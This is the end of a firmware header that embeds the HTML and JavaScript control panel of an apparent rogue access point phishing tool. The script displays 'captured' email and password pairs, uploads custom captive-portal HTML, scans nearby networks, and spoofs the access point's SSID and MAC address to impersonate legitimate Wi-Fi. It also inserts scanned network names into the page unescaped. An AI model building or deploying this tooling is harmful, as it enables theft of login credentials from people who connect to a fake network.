                const usernameColumn = credentialsTableBody.querySelector('.credentials-column:first-child');
                const passwordColumn = credentialsTableBody.querySelector('.credentials-column:last-child');
                
                // Clear all but the header from both columns
                Array.from(usernameColumn.children).forEach((item, index) => { if (index > 0) item.remove(); });
                Array.from(passwordColumn.children).forEach((item, index) => { if (index > 0) item.remove(); });

                if (finalAttempts && finalAttempts.length > 0) {
                    finalAttempts.forEach(attempt => {
                        const userItem = document.createElement('div');
                        userItem.className = 'credential-item';
                        userItem.textContent = attempt.email;
                        usernameColumn.appendChild(userItem);

                        const passItem = document.createElement('div');
                        passItem.className = 'credential-item';
                        passItem.textContent = attempt.password;
                        passwordColumn.appendChild(passItem);
                    });
                    credentialsScrollHint.style.display = 'block'; 
                    credentialsScrollHint.textContent = 'scroll if more...';
                } else {
                    credentialsScrollHint.style.display = 'block';
                    credentialsScrollHint.textContent = 'No credentials captured yet.';
                }
            }

            async function getAndUpdateNearbyAPsTable() {
                const apList = await fetchData('/api/aplist');
                const finalApList = apList;

                nearbyApsTbody.innerHTML = '';

                if (finalApList && finalApList.length > 0) {
                    finalApList.forEach(ap => {
                        const row = document.createElement('div');
                        row.className = 'table-row-data';
                        row.innerHTML = `
                            <div class="network-item">${ap.ssid}</div>
                            <div class="mac-value">${ap.mac}</div>
                            <div class="rssi-value">${ap.rssi}</div>
                        `;
                        nearbyApsTbody.appendChild(row);
                    });
                    const noDataHintDiv = nearbyApsTbody.parentElement.querySelector('.table-row-data[style*="font-style: italic"]');
                    if (noDataHintDiv) noDataHintDiv.style.display = 'none';

                } else {
                    const noDataHintDiv = nearbyApsTbody.parentElement.querySelector('.table-row-data[style*="font-style: italic"]');
                    if (noDataHintDiv) {
                        noDataHintDiv.style.display = 'grid';
                        noDataHintDiv.querySelector('div').textContent = 'No access points found. Click \'Scan APs\' to search.';
                    }
                }
            }

            // --- Event Listeners ---
            scrollLeftBtn.addEventListener('click', () => scrollPortals('left'));
            scrollRightBtn.addEventListener('click', () => scrollPortals('right'));

            uploadButton.addEventListener('click', async function() {
                const htmlContent = htmlCodeInput.value;
                if (htmlContent.trim() === '') {
                    console.log('Please paste some HTML code to upload.');
                    return;
                }
                console.log('Uploading custom HTML...');
                const result = await postData('/upload', { html: htmlContent });
                if (result && result.status === 'success') {
                    console.log(result.message);
                    getAndRenderPortals(); 
                } else {
                     console.error('Custom HTML upload failed:', result ? result.message : 'Unknown error');
                }
            });

            scanApsButton.addEventListener('click', async function() {
                console.log('Scanning for Access Points...');
                const result = await postData('/apscanner', {});
                if (result && result.status === 'success') {
                    console.log(result.message);
                    getAndUpdateNearbyAPsTable(); 
                }
            });

            applyChangesButton.addEventListener('click', async function() {
                const newSsid = ssidInput.value.trim();
                const newMac = macInput.value.trim();
                if (newSsid === '' || newMac === '') {
                    console.log('Please enter both SSID and MAC Address.');
                    return;
                }
                console.log('Applying SoftAP changes...');
                const result = await postData('/changesettings', { ssid: newSsid, mac: newMac });
                if (result && result.status === 'success') {
                    console.log(result.message);
                    currentSsidDisplay.textContent = newSsid;
                    currentMacDisplay.textContent = newMac;
                    ssidInput.value = newSsid;
                    macInput.value = newMac;
                } else {
                    console.error('Apply changes failed:', result ? result.message : 'Unknown error');
                }
            });

            getAndRenderPortals(); 
            getAndUpdateAccessPointDetails();
            getAndUpdateConnectedClients();

            getAndUpdateCredentialsTable();
            getAndUpdateNearbyAPsTable();

            setInterval(getAndUpdateConnectedClients, 5000);

            function scrollPortals(direction) {
                const scrollAmount = portalsContainer.clientWidth / 2;
                portalsContainer.scrollBy({
                    left: direction === 'right' ? scrollAmount : -scrollAmount,
                    behavior: 'smooth'
                });
            }
        });
    </script>
</body>
</html>
)rawliteral";

#endif